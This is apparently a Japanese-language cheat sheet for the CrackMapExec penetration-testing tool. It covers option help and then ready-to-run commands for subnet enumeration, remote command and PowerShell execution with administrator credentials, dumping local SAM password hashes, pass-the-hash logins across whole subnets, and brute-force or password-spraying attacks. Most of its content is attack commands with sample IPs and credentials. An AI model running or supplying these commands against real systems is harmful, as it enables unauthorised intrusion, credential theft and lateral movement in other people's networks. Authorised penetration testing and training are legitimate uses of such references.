# crackmapexec
usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--darrell] [--verbose]
                    {winrm,smb,ldap,mssql,ssh} ...   
options:   
 <p> -h, --help &emsp;このヘルプメッセージを表示し、終了します <br>     
  -t THREADS&emsp;  同時に使用するスレッド数を設定します (デフォルト: 100)<br>  
  --timeout TIMEOUT&emsp;  各スレッドの最大タイムアウトを秒単位で設定します (デフォルト: なし)<br>   
  --jitter INTERVAL&emsp;  各接続の間にランダムな遅延を設定する (デフォルト: なし) <br> 
  --darrell   &emsp;ダレルに手を貸す   <br>
  --verbose  &emsp;  詳細な出力を有効にする</p>   

プロトコルを指定します:   
  利用可能なプロトコル   {winrm,smb,ldap,mssql,ssh}   
    winrm:&emsp;	WINRMを使用した独自のもの      
    smb: &emsp;        SMBを使用した独自のもの  
    ldap: &emsp;        LDAPを使用した独自のもの   
    mssq:&emsp;    MSSQLを使用した独自のもの   
    ssh:&emsp;           SSHを使用した独自のもの   





# ネットワーク列挙
```
crackmapexec 192.168.0.0/24
```
# コマンドの実行
```
#whoamiの実行
crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
```
-xフラグを使用して、PowerShellコマンドを直接実行することも出来る
```
crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
```
# ログインしているユーザーを確認
```
crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --lusers
```
# ローカル SAM ハッシュのダンプ
```
crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam
```
# ハッシュの受け渡し
CME は、-H フラグを使用した Passing-The-Hash 攻撃を使用した SMB 経由の認証をサポート
```
crackmapexec smb <target(s)> -u username -H LMHASH:NTHASH
```
```
crackmapexec smb <target(s)> -u username -H LMHASH:NTHASH
```
# サブネットに対するハッシュの受け渡し
admin + hash を使用して smb 経由ですべてのサブネット マシンにログインします。–local-auth と見つかったローカル管理者パスワードを使用することにより、これを使用して、そのローカル管理者パス/ハッシュを使用してサブネット全体の smb 対応マシンにログインできます。
```
crackmapexec smb 172.16.157.0/24 -u administrator -H 'aad3b435b51404eeaa35b51404ee:5509de4ff0a6e8d9f4a61100e51' --local-auth
```
# ブルート フォーシングとパスワード スプレー
これを行うには、crackmapexec をサブネットでポイントし、creds を渡します   
SMB の例
```
crackmapexec 10.0.2.0/24 -u ‘admin’ -p ‘P@ssw0rd' 
```
すべてのプロトコルは、総当たり攻撃とパスワード スプレーをサポートしています。特定のプロトコルを使用したブルート フォース/パスワード スプレーの詳細については、適切な wiki セクションを参照してください。
ファイルまたは複数の値を指定することにより、CME は指定されたプロトコルを使用して、すべてのターゲットに対して自動的にブルート フォース ログインを行います。
-u,-pそれぞれテキストファイルでもクラック出来る。
